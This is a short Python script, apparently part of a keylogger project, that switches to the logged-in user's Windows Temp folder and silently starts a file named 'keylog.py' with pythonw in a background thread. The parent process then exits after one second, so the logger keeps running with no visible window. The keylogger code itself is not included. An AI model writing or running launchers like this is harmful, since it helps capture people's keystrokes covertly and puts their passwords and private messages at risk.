import subprocess
import os
import threading
import time

username= os.getlogin()
path=f"C:\\Users\\{username}\\AppData\\Local\\Temp"

os.chdir(path)

def startkey():
    subprocess.call(f"pythonw .\\keylog.py")

if __name__ == "__main__":
    t= threading.Thread(target=startkey)
    t.start()
    # subprocess.call(f"pythonw .\\keylog.py")
    time.sleep(1)
    os._exit(0)
    
